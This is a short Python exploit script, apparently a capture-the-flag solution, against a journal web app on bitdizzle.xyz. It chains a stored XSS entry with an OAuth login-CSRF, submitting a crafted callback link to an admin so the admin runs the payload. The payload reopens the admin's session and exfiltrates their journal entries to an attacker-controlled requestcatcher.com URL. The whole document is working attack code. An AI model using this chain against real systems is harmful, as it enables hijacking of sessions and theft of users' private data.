import requests, secrets

ATTACKER_CONTROLLED_DOMAIN = "https://dfsafsdfasdf.requestcatcher.com/"


# this ensures any cookies that we are given are sent in subsequent requests, even if not explicitly set
s = requests.Session()


# logins us into a random account on accounts.bitdizzle.xyz, then authenticates to the journal.bitdizzle.xyz server
r = s.post("https://accounts.bitdizzle.xyz/login",data={"username":secrets.token_hex(8)},allow_redirects=True)
r = s.get("https://accounts.bitdizzle.xyz/oauth_authorize?client_id=f45735d5a3b056b6&redirect_uri=https%3A%2F%2Fjournal.bitdizzle.xyz%2Foauth_callback")


# XSS payload that will have the admin log back into their account on journal.bitdizzle.xyz in a new window, then have the original window steal the contents (which will be the admin's journal entries) and exfiltrate to our domain
payload = """
</script><script>g = window.open('https://accounts.bitdizzle.xyz/oauth_authorize?client_id=f45735d5a3b056b6&redirect_uri=https%3A%2F%2Fjournal.bitdizzle.xyz%2Foauth_callback');  g.onload = () => { location.href=`"""+ATTACKER_CONTROLLED_DOMAIN+"""/xss?${JSON.stringify(g.initialProps)}`; }; </script>
"""

# now that we have our payload and are authenticated to journal, we will post our payload as a new entry
r = s.post("https://journal.bitdizzle.xyz/entries/",json={"title":"bad","body":payload})


# we generate another OAuth token for our random account, but disable redirects so we can get the location header without actually visiting it
r = s.get("https://accounts.bitdizzle.xyz/oauth_authorize?client_id=f45735d5a3b056b6&redirect_uri=https%3A%2F%2Fjournal.bitdizzle.xyz%2Foauth_callback",allow_redirects=False)


# make the admin sign in to the journal server with the OAuth token we just generated, forcing them to run our XSS payload on the main page
x = s.post("https://accounts.bitdizzle.xyz/submit_link",data={"link":r.headers["Location"]})

print("Exploit complete. Please visit your domain to view the journal entries that were exfiltrated.")

# logout
s.post("https://accounts.bitdizzle.xyz/logout")